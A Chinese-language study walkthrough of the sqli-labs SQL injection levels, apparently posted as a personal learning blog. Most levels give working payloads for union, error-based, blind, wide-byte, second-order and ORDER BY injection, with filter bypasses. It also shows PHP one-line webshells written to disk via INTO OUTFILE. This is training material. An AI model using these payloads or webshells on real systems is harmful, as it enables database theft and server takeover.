+<p>把/tmp/t0.txt 导入到 t0 表中，character set gbk 是字符集设置为 gbk，fields terminated by 是每一项数据之间的分隔符，lines terminated by 是行的结尾符</p>
+<p>SELECT…..INTO OUTFILE ‘file_name’<br>把被选择的行写入一个文件中必须有 file 权限<br>一般有两种形式<br>直接将 select 内容写入文件<br>Select version() into outfile”c:\phpnow\htdocs\test.php”<br>也可以把 version()换成一句话木马，在用菜刀连接</p>
+<?php @eval($_post["shadow"])?>
+
+<p>Select version() Into outfile”c:\phpnow\htdocs\test.php” LINES TERMINATED BY 0x16 进制文件<br>解释：通常是用‘\r\n’结尾，此处我们修改为自己想要的任何文件。同时可以用 FIELDS TERMINATED BY</p>
+<h3 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h3><p>首先使用 and (select count(<em>) from mysql.user)&gt;0/</em>测试是否有读写权限，若有则返回正常<br>构造注释掉’)) or 1=1–+</p>
+<p>在指定文件夹创建 uuu.txt<br><a href="http://localhost/sqli-labs-master/Less-7/?id=1%27" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-7/?id=1’))UNION</a>)UNION) SELECT 1,2,3 into outfile “d:\webanquan\zkaq\WWW\sqli-labs-master\Less-7\uuu.txt”%23<br>针对无法写入<br><a href="https://www.jianshu.com/p/7b9256de20d1" target="_blank" rel="noopener">https://www.jianshu.com/p/7b9256de20d1</a><br><a href="https://blog.csdn.net/weixin_39631030/article/details/79873936" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39631030/article/details/79873936</a><br>无法写入是因为 MySQL 的 secure_file_priv 设置为 null，不允许读写<br>方法：打开 MySQL 的安装目录下的 my.ini，在 mysqld 模块里添加 secure_file_priv = ‘’    记得改完后重启 mysql 服务</p>
+<p>还可以用这种方法把一句话木马写进去，用菜刀连接，虽然我不能连接成功<br>‘<?php @eval($_GET["chen"])?>‘</p>
+<h3 id="less-8-10"><a href="#less-8-10" class="headerlink" title="less-8~10"></a>less-8~10</h3><p>都是用前面背景知识 3，基本都是基于时间的盲注，大致思路如下<br>猜测数据库：<br><a href="http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))–</a>+<br>说明第一位是 s （ascii 码是 115）<br><a href="http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),2,1))=101,1,sleep(5))--" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),2,1))=101,1,sleep(5))–</a>+<br>说明第一位是 e （ascii 码是 101）<br>….<br>以此类推，我们知道了数据库名字是 security<br>猜测 security   的数据表：<br><a href="http://127.0.0.1/sqllib/Less-9/?id=1%27and" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-9/?id=1’and</a> If(ascii(substr((select table_name from information_s<br>chema.tables where table_schema=’security’ limit 0,1),1,1))=101,1,sleep(5))–+<br>猜测第一个数据表的第一位是 e,…依次类推，得到 emails<br><a href="http://127.0.0.1/sqllib/Less-9/?id=1%27and" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-9/?id=1’and</a> If(ascii(substr((select table_name from information_s<br>chema.tables where table_schema=’security’ limit 1,1),1,1))=114,1,sleep(5))–+<br>猜测第二个数据表的第一位是 r,…依次类推，得到 referers<br>…<br>再以此类推，我们可以得到所有的数据表 emails,referers,uagents,users<br>猜测 users   表的列：<br><a href="http://127.0.0.1/sqllib/Less-9/?id=1%27and" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-9/?id=1’and</a> If(ascii(substr((select column_name from information<br>_schema.columns where table_name=’users’ limit 0,1),1,1))=105,1,sleep(5))–+<br>猜测 users 表的第一个列的第一个字符是 i，<br>以此类推，我们得到列名是 id，username，password<br>猜测 username   的值：<br><a href="http://127.0.0.1/sqllib/Less-9/?id=1%27and" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-9/?id=1’and</a> If(ascii(substr((select username from users limit 0,1),<br>1,1))=68,1,sleep(5))–+<br>猜测 username 的第一行的第一位<br>以此类推，我们得到数据库 username，password 的所有内容</p>
+<h3 id="less-11-12："><a href="#less-11-12：" class="headerlink" title="less-11~12："></a>less-11~12：</h3><p>post 注入<br>用户名：admin’<br>密码：111<br>报错：’111’ LIMIT 0,1’<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘1111’ LIMIT 0,1’ at line 1<br>出错原因应该是 password 字段被引号包起来了，导致引号不匹配<br>select username,password from users where username=’admin’’ and password=’111’ limit 0,1</p>
+<p>构造语句  admin’ or ‘1’=’1<br>密码随意，登录成功</p>
+<p>用户名：admin’<br>密码：admin<br>报错，返回信息 ‘’admin’’ and password=’’ LIMIT 0,1’<br>可以推断出都是’username’  ‘password’  单引号分开</p>
+<p>Username：1admin’union select 1,database()#      这里不明白，1admin  前面是数字就行，把数字放后面就不行了，admin1 可能是存在这么一个用户名，没法激发后面的联合查询<br>passwd=1（任意密码）        密码随意是因为#那后面的注释掉了<br>返回数据库名称</p>
+<h3 id="less-13-14"><a href="#less-13-14" class="headerlink" title="less-13~14:"></a>less-13~14:</h3><p>先单引号测试，再根据返回的错误信息，构造语句<br>这一关是’) or 1=1–+<br>可以发现登录成功或失败只显示登录成功或失败<br>登录成功后不会显示用户名和密码，所以，需要用到盲注<br>用户名：admin’)and mid(database(),1,1)&gt;’a’#<br>密码：随意</p>
+<h3 id="less-15-16"><a href="#less-15-16" class="headerlink" title="less-15~16:"></a>less-15~16:</h3><p>盲注，简直是够了，什么错误都不显示，除了登录成功与否，只能把所有如：’    “    ‘)     ‘))      “))方法试一遍</p>
+<h1 id="背景知识-4："><a href="#背景知识-4：" class="headerlink" title="背景知识 4："></a>背景知识 4：</h1><h2 id="MySQL-数据库中的增删改查"><a href="#MySQL-数据库中的增删改查" class="headerlink" title="MySQL 数据库中的增删改查"></a>MySQL 数据库中的增删改查</h2><p>查就是 select,增是 insert,删就是 delect 或 drop,改就是 update</p>
+<p>增：insert into users values(‘16’,’lcamry’,’lcamry’);</p>
+<p>删：<br>删数据<br>delete from 表名;<br>delete from 表名 where id=1;<br>删节构<br>删数据库：drop database 数据库名;<br>删除表：drop table 表名;<br>删除表中的列:alter table 表名 drop column 列名;</p>
+<p>改：<br>修改所有：updata 表名 set 列名=’新的值，非数字加单引号’ ;<br>带条件的修改：updata 表名 set 列名=’新的值，非数字加单引号’ where id=6;</p>
+<p>addslashes()函数返回在预定义字符之前添加反斜杠的字符串<br>预定义字符：单引号，双引号，反斜杠，null<br>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串<br>用了这个以后就不能用’或”来闭合前面的语句了</p>
+<p>stripslashes()删除由 addslashes()添加的反斜线</p>
+<p>mysql_real_escape_string(string,connection)转义 sql 语句中使用字符串中的特殊字符<br>\x00<br>\n<br>\r<br>‘<br>“<br>\x1a<br>都会受到影响，若成功，返回被转义的字符串，若失败，返回 false</p>
+<h3 id="less-17"><a href="#less-17" class="headerlink" title="less-17:"></a>less-17:</h3><p>（这题我还以为是用更改数据的方式改密码呐，原来是在改密码的界面爆数据。。。）<br>本关中的 username 被限制了，所以只能在 password 输入<br>输入：<br>123’ and (updatexml(1,concat(0x5c,version(),0x5c),1))#<br>在 concat()里替换成要查询的语句，注意用括号括起来，并且需要 limit 限制，不然查询不出来</p>
+<h3 id="less-18"><a href="#less-18" class="headerlink" title="less-18:"></a>less-18:</h3><p>输入 admin，admin 测试后发现会查询 IP 和 user agent，所以通过 burp 抓包后修改这两个地方的参数，加入 sql 查询语句<br>‘and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’=’1</p>
+<h3 id="less-19："><a href="#less-19：" class="headerlink" title="less-19："></a>less-19：</h3><p>测试后发现返回的是 referer<br>构造查询语句<br>‘and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and ‘1’=’1</p>
+<h3 id="less-20："><a href="#less-20：" class="headerlink" title="less-20："></a>less-20：</h3><p>测试后发现在 cookie 处可以注入，还是用 burp 抓包后更改为 sql 注入语句<br>这里是通过 cookie 来获取 uname 的，所以改成下面这样<br>uname=admin1’and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</p>
+<h3 id="less-21："><a href="#less-21：" class="headerlink" title="less-21："></a>less-21：</h3><p>这里对 cookie 进行了 base64 处理，所以只要把要注入的 SQL 语句转换成 base64 就行</p>
+<h3 id="less-22："><a href="#less-22：" class="headerlink" title="less-22："></a>less-22：</h3><p>同样是 base64 处理，但是要注意前面闭合的时候要用双引号</p>
+<h4 id="HTTP-头部详解"><a href="#HTTP-头部详解" class="headerlink" title="HTTP 头部详解"></a>HTTP 头部详解</h4><p>1、 Accept：告诉 WEB 服务器自己接受什么介质类型，<em>/</em> 表示任何类型，type/* 表示该类型下的所有子类型，type/sub-type。</p>
+<p>2、Accept-Charset： 浏览器申明自己接收的字符集，Accept-Encoding： 浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate），Accept-Language：：浏览器申明自己接收的语言</p>
+<p>语言跟字符集的区别：中文是语言，中文有多种字符集，比如 big5，gb2312，gbk 等等。</p>
+<p>3、 Accept-Ranges：WEB 服务器表明自己是否接受获取其某个实体的一部分（比如文件的一部分）的请求。bytes：表示接受，none：表示不接受。</p>
+<p>4、 Age：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了。</p>
+<p>5、 Authorization：当客户端接收到来自 WEB 服务器的 WWW-Authenticate 响应时，用该头部来回应自己的身份验证信息给 WEB 服务器。</p>
+<p>6、 Cache-Control：请求：no-cache（不要缓存的实体，要求现在从 WEB 服务器去取）</p>
+<p>7、 Connection：请求：close（告诉 WEB 服务器或者代理服务器，在完成本次请求的响应后，断开连接，不要等待本次连接的后续请求了）。keepalive（告诉 WEB 服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求）。</p>
+<p>响应：close（连接已经关闭）。<br>keepalive（连接保持着，在等待本次连接的后续请求）。<br>Keep-Alive：如果浏览器请求保持连接，则该头部表明希望 WEB 服务器保持连接多长时间（秒）。例如：Keep-Alive：300</p>
+<p>8、 Content-Encoding：WEB 服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。例如：Content-Encoding：gzip</p>
+<p>9、Content-Language：WEB 服务器告诉浏览器自己响应的对象的语言。</p>
+<p>10、Content-Length：WEB 服务器告诉浏览器自己响应的对象的长度。例如：Content-Length:26012</p>
+<p>11、Content-Range： WEB 服务器表明该响应包含的部分对象为整个对象的哪个部分。例如：Content-Range: bytes 21010-47021/47022</p>
+<p>12、Content-Type： WEB 服务器告诉浏览器自己响应的对象的类型。例如：Content-Type：application/xml</p>
+<p>13、 ETag：就是一个对象（比如 URL）的标志值，就一个对象而言，比如一个 html 文件，如果被修改了，其 Etag 也会别修改，所以 ETag 的作用跟 Last-Modified 的作用差不多，主要供 WEB 服务器判断一个对象是否改变了。比如前一次请求某个 html 文件时，获得了其 ETag，当这次又请求这个文件时，浏览器就会把先前获得的 ETag 值发送给 WEB 服务器，然后 WEB 服务器会把这个 ETag 跟该文件的当前 ETag 进行对比，然后就知道这个文件有没有改变了。</p>
+<p>14、 Expired：WEB 服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟 WEB 服务器验证了其有效性后，才能用来响应客户请求。是 HTTP/1.0 的头部。例如：Expires：Sat, 23 May 2009 10:02:12 GMT</p>
+<p>15、 Host：客户端指定自己想访问的 WEB 服务器的域名/IP 地址和端口号。例如：Host：rss.sina.com.cn</p>
+<p>16、 If-Match：如果对象的 ETag 没有改变，其实也就意味著对象没有改变，才执行请求的动作。</p>
+<p>17、If-None-Match：如果对象的 ETag 改变了，其实也就意味著对象也改变了，才执行请求的动作。</p>
+<p>18、 If-Modified-Since：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（比如返回对象），否则返回代码 304，告诉浏览器 该对象没有修改。例如：If-Modified-Since：Thu, 10 Apr 2008 09:14:42 GMT</p>
+<p>19、If-Unmodified-Since：如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）。</p>
+<p>20、 If-Range：浏览器告诉 WEB 服务器，如果我请求的对象没有改变，就把我缺少的部分给我，如果对象改变了，就把整个对象给我。浏览器通过发送请求对象的 ETag 或者 自己所知道的最后修改时间给 WEB 服务器，让其判断对象是否改变了。总是跟 Range 头部一起使用。</p>
+<p>21、 Last-Modified：WEB 服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue, 06 May 2008 02:42:43 GMT</p>
+<p>22、 Location：WEB 服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头部 指 定 的 位 置 去 取 。 例 如 ： Location ： <a href="http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif" target="_blank" rel="noopener">http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif</a></p>
+<p>23、 Pramga：主要使用 Pramga: no-cache，相当于 Cache-Control： no-cache。例如：Pragma：no-cache</p>
+<p>24、 Proxy-Authenticate： 代理服务器响应浏览器，要求其提供代理身份验证信息。Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。</p>
+<p>25、 Range：浏览器（比如 Flashget 多线程下载时）告诉 WEB 服务器自己想取对象的哪部分。例如：Range: bytes=1173546-</p>
+<p>26、 Referer：浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL。例如：Referer：<a href="http://www.sina.com/" target="_blank" rel="noopener">http://www.sina.com/</a></p>
+<p>27、 Server: WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61(Unix)</p>
+<p>28、 User-Agent: 浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent：Mozilla/5.0(Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 Firefox/2、0、0、14</p>
+<p>29、 Transfer-Encoding: WEB 服务器表明自己对本响应消息体（不是消息体里面的对象）作了怎样的编码，比如是否分块（chunked）。例如：Transfer-Encoding: chunked</p>
+<p>30、 Vary: WEB 服务器用该头部的内容告诉 Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源 WEB 服务器在接到第一个请求消息时，其响应消息的头部为：Content- Encoding: gzip; Vary: Content-Encoding 那么 Cache 服务器会分析后续请求消息的头部，检查其 Accept-Encoding，是否跟先前响应的 Vary 头部值一致，即是否使用相同的内容编码方法，这样就可以防止 Cache 服务器用自己 Cache 里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding</p>
+<p>31、补充： X-Forwarded-For，用来伪造请求的 IIP 地址</p>
+<h3 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h3><p>对#跟–做了过滤，<br>$reg = “/#/“;<br>$reg1 = “/–/“;<br>$replace = “”;<br>$id = preg_replace($reg, $replace, $id);<br>$id = preg_replace($reg1, $replace, $id);</p>
+<p>需要用单引号去闭合后面的：<br><a href="http://43.247.91.228:84/Less-23/?id=-1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-23/?id=-1</a>‘ union select 1,2,’3<br>可以发现 2，3 回显</p>
+<p><a href="http://43.247.91.228:84/Less-23/?id=-1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-23/?id=-1&#39;</a> union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),’3</p>
+<h3 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h3><p>二次注入，先注册一个 admin’#的用户名，然后当修改密码的时候会执行一下查询语句</p>
+<p>update user set password=’修改的密码’ where username=’admin’#’<br>这样就成功修改了 admin  的密码了</p>
+<h3 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h3><p>过滤掉了 or  和 and  测试的时候用 ||  就可以，注入的时候 information 要改成 infoorrmation，来补上 or</p>
+<p><a href="http://43.247.91.228:84/Less-25/?id=-1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-25/?id=-1&#39;</a> union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’),3–+</p>
+<h3 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h3><p>不闭合的情况下执行 25 关的就可以<br><a href="http://43.247.91.228:84/Less-25a/?id=-1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-25a/?id=-1</a> union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’),3–+</p>
+<h3 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h3><p>注释被过滤掉，可以使用单引号闭合，?id=-1’ or ‘1’=’1<br>同时  or  也被注释掉了，需要双写绕过 infoormation</p>
+<p>空格过滤了，用下面这些替换<br>%09    TAB 键（水平）<br>%0a    新建一行<br>%0b    TAB 键（垂直）<br>%0c    新的一页<br>%0d    return 功能<br>%a0    空格</p>
+<p><a href="http://43.247.91.228:84/Less-26/?id=-1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-26/?id=-1&#39;</a> union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=’security’),’3</p>
+<h3 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h3><p>改成了用 (‘’)  来闭合<br><a href="http://43.247.91.228:84/Less-26a/?id=100&#39;)union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=&#39;security&#39;),3||" target="_blank" rel="noopener">http://43.247.91.228:84/Less-26a/?id=100&#39;)union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=&#39;security&#39;),3||</a>(‘1</p>
+<h3 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h3><p>过滤 select  和 union  但是大小写绕过<br><a href="http://43.247.91.228:84/Less-27/?id=100&#39;%a0uNion%a0seleCt%a01,2,3||&#39;1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-27/?id=100&#39;%a0uNion%a0seleCt%a01,2,3||&#39;1</a></p>
+<p>注出表名<br><a href="http://43.247.91.228:84/Less-27/?id=100&#39;%a0uNion%a0seleCt%a01,(sElect%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=&#39;security&#39;),3||&#39;1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-27/?id=100&#39;%a0uNion%a0seleCt%a01,(sElect%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=&#39;security&#39;),3||&#39;1</a></p>
+<h3 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h3><p>这关闭合用的是 “<br><a href="http://43.247.91.228:84/Less-27a/?id=100&quot;%a0uNion%a0seleCt%a01,(sElect%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=&#39;security&#39;),3||&quot;1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-27a/?id=100&quot;%a0uNion%a0seleCt%a01,(sElect%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=&#39;security&#39;),3||&quot;1</a></p>
+<h3 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h3><p>闭合用的是 ‘)  但是竟然没有过滤 select 和 union !?<br><a href="http://43.247.91.228:84/Less-28/?id=10000&#39;)union%a0select%a0(1),(2),(3)||" target="_blank" rel="noopener">http://43.247.91.228:84/Less-28/?id=10000&#39;)union%a0select%a0(1),(2),(3)||</a>(‘1</p>
+<p><a href="http://43.247.91.228:84/Less-28/?id=10000&#39;)union%a0select%a0(1),(select%a0group_concat(table_name)from%a0information_schema.tables%a0where%a0table_schema=&#39;security&#39;),(3)||" target="_blank" rel="noopener">http://43.247.91.228:84/Less-28/?id=10000&#39;)union%a0select%a0(1),(select%a0group_concat(table_name)from%a0information_schema.tables%a0where%a0table_schema=&#39;security&#39;),(3)||</a>(‘1</p>
+<h3 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h3><p>跟之前的 28 一样啊！？</p>
+<h3 id="less-29-31"><a href="#less-29-31" class="headerlink" title="less-29-31"></a>less-29-31</h3><p>29  主要是用了两个服务器，第一个充当 waf<br>第一个服务器时 tomcat 第二个是 apache，tomcat 解析参数时从前面解析，apache 解析参数时从后面解析，所以可以传递两个参数 ?id=1&amp;id=2  他会解析第二个</p>
+<p><a href="http://43.247.91.228:84/Less-29/?id=1&amp;id=1000&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-29/?id=1&amp;id=1000&#39;</a> union select 1,2,3–+<br><a href="http://43.247.91.228:84/Less-29/?id=1&amp;id=1000&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-29/?id=1&amp;id=1000&#39;</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+</p>
+<p>30 只是用 “  来限定<br>31 用 “)</p>
+<h3 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h3><p>宽字节注入，，只需要在 ‘  前面加上个 %aa  让转义字符失效就可以了<br><a href="http://43.247.91.228:84/Less-32/?id=-1%aa&#39;union" target="_blank" rel="noopener">http://43.247.91.228:84/Less-32/?id=-1%aa&#39;union</a> select 1,2,3–+</p>
+<h3 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h3><p><a href="http://43.247.91.228:84/Less-33/?id=-1%aa&#39;union" target="_blank" rel="noopener">http://43.247.91.228:84/Less-33/?id=-1%aa&#39;union</a> select 1,2,3–+</p>
+<h3 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h3><p>post 方式，没法 urlencode，所以使用：<br>�’or 1=1#<br>�’union select 1,2#<br>�’union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479#</p>
+<h3 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h3><p><a href="http://43.247.91.228:84/Less-35/?id=-1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-35/?id=-1</a> or 1=1–+</p>
+<p><a href="http://43.247.91.228:84/Less-35/?id=-1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-35/?id=-1</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479–+</p>
+<h3 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h3><p><a href="http://43.247.91.228:84/Less-36/?id=-1%aa&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-36/?id=-1%aa&#39;</a> union select 1,2,3–+</p>
+<p><a href="http://43.247.91.228:84/Less-36/?id=-1%aa&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-36/?id=-1%aa&#39;</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479–+</p>
+<h3 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h3><p>�’union select 1,2#</p>
+<p>�’union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479#</p>
+<h3 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h3><p><a href="http://43.247.91.228:84/Less-38/?id=-1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-38/?id=-1&#39;</a> union select 1,2,3–+</p>
+<p><a href="http://43.247.91.228:84/Less-38/?id=-1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-38/?id=-1&#39;</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+</p>
+<h1 id="堆叠注入："><a href="#堆叠注入：" class="headerlink" title="堆叠注入："></a>堆叠注入：</h1><h3 id="less-38-40："><a href="#less-38-40：" class="headerlink" title="less-38-40："></a>less-38-40：</h3><p>堆叠注入，不同的是 sql 查询语句不一样，有的是 ‘’ 有的是数字型，有的是（’’）类型的，只需要闭合就可以了</p>
+<h3 id="less-41-45"><a href="#less-41-45" class="headerlink" title="less-41-45"></a>less-41-45</h3><p>知识换成了 post 方式，在 password 处没有过滤，使用上面的攻击就可以</p>
+<h1 id="ORDER-BY-注入"><a href="#ORDER-BY-注入" class="headerlink" title="ORDER BY  注入"></a>ORDER BY  注入</h1><p>order by  不能使用  union select，先来了解一下  order by  的一些参数<br>asc  升序，desc  降序，如果在后面分别试这两个，排序结果不一样那么就说明可能存在注入<br>由于 order by 后面只能接 (字段名，位置，表达式) 等信息，如果并不能向原来一样使用联合查询。这里面直接使用 sort=(select …) 的方式来实现报错注入</p>
+<h2 id="order-by-报错注入"><a href="#order-by-报错注入" class="headerlink" title="order by 报错注入"></a>order by 报错注入</h2><p>这是在 mysql  下测试的报错语句，可以用到<br>select * from users order by id and(updatexml(1,concat(0x7e,(select database())),0));<br>ERROR 1105 (HY000): XPATH syntax error: ‘~security’        //获取当前数据库</p>
+<p>select * from users order by id and(updatexml(1,concat(0x7e,(select version())),0));<br>ERROR 1105 (HY000): XPATH syntax error: ‘~5.5.53’      //获取数据库版本</p>
+<p>select * from users order by id and(updatexml(1,concat(0x7e,(select user())),0));<br>ERROR 1105 (HY000): XPATH syntax error: ‘~root@localhost’     //获取用户</p>
+<p>select * from users order by id and(updatexml(1,concat(0x7e,(select @@datadir)),0));<br>ERROR 1105 (HY000): XPATH syntax error: ‘~E:\soft\phpmystudy\MySQL\data&#39;        //获取数据库路径</p>
+<p>select * from users order by id and(updatexml(1,concat(0x7e,(select @@version_compile_os)),0));<br>ERROR 1105 (HY000): XPATH syntax error: ‘~Win32’      //获取操作系统</p>
+<p>select * from users order by id and(updatexml(1,concat(0x7e,(select @@basedir)),0));<br>ERROR 1105 (HY000): XPATH syntax error: ‘~E:/soft/phpmystudy/MySQL/‘       //mysql 安装路径</p>
+<p>select * from users order by id and(updatexml(1,concat(0x7e,(select session_user())),0));<br>ERROR 1105 (HY000): XPATH syntax error: ‘~root@localhost’      //获取连接数据库的用户名</p>
+<p>select * from users order by id and(updatexml(1,concat(0x7e,(select current_user())),0));<br>ERROR 1105 (HY000): XPATH syntax error: ‘~root@localhost’      //获取当前用户名</p>
+<p>select * from users order by id and(updatexml(1,concat(0x7e,(select system_user())),0));<br>ERROR 1105 (HY000): XPATH syntax error: ‘~root@localhost’        //获取系统用户名</p>
+<p>通过报错注入例如：<br><a href="http://43.247.91.228:84/Less-46/?sort=" target="_blank" rel="noopener">http://43.247.91.228:84/Less-46/?sort=</a>(updatexml(1,concat(0x7e,(select @@version),0x7e),1))<br><a href="http://43.247.91.228:84/Less-46/?sort=" target="_blank" rel="noopener">http://43.247.91.228:84/Less-46/?sort=</a>(extractvalue(1,concat(0x7e,(select @@version),0x7e)))<br><a href="http://43.247.91.228:84/Less-46/?sort=" target="_blank" rel="noopener">http://43.247.91.228:84/Less-46/?sort=</a>(updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’security’ limit 3,1),0x7e),1))</p>
+<h2 id="order-by-盲注"><a href="#order-by-盲注" class="headerlink" title="order by  盲注"></a>order by  盲注</h2><p>##</p>
+<p>select _ from users order by id ^(select(select version()) regexp ‘^5’);  不正常排序<br>select _ from users order by id ^(select(select version()) regexp ‘^aaaa’);  正常排序</p>
+<p>因为异或 0  的时候相当于啥都不做，，所以只要是显示乱序就表示这个猜对了</p>
+<h3 id="less-46"><a href="#less-46" class="headerlink" title="less-46"></a>less-46</h3><p><a href="http://43.247.91.228:84/Less-46/?sort=" target="_blank" rel="noopener">http://43.247.91.228:84/Less-46/?sort=</a>(extractvalue(1,concat(0x7e,(select @@version),0x7e)))<br><a href="http://43.247.91.228:84/Less-46/?sort=" target="_blank" rel="noopener">http://43.247.91.228:84/Less-46/?sort=</a>(extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’security’ limit 0,1),0x7e)))</p>
+<h3 id="less-47"><a href="#less-47" class="headerlink" title="less-47"></a>less-47</h3><p>前面改成了 ‘ $id ‘，只需要闭合单引号就可以了<br><a href="http://43.247.91.228:84/Less-47/?sort=1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-47/?sort=1&#39;</a> and 1=(extractvalue(1,concat(0x7e,(select @@version),0x7e)))–+<br><a href="http://43.247.91.228:84/Less-47/?sort=1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-47/?sort=1&#39;</a> and 1=(extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’security’ limit 3,1),0x7e)))–+</p>
+<h3 id="less-48"><a href="#less-48" class="headerlink" title="less-48"></a>less-48</h3><p>不返回错误信息，盲注！<br>根据上面的，慢慢试吧！？<br><a href="http://43.247.91.228:84/Less-48/?sort=id" target="_blank" rel="noopener">http://43.247.91.228:84/Less-48/?sort=id</a> ^(select(select version()) regexp ‘^5’)</p>
+<h3 id="less-49"><a href="#less-49" class="headerlink" title="less-49"></a>less-49</h3><p>又用了单引号闭合，还需要绕过单引号<br>这里可以通过基于时间的盲注来实现（上面哪种方法还没试出来怎么绕过那个单引号）<br><a href="http://43.247.91.228:84/Less-49/?sort=1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-49/?sort=1&#39;</a> and if(ascii(substr(database(),1,1))=112,1,sleep(0.2))%23</p>
+<h3 id="less-50"><a href="#less-50" class="headerlink" title="less-50"></a>less-50</h3><p>题目说的是堆叠注入，但是报错注入也是可以的</p>
+<h3 id="less-51"><a href="#less-51" class="headerlink" title="less-51"></a>less-51</h3><p>单引号引起来了，绕过正常注入</p>
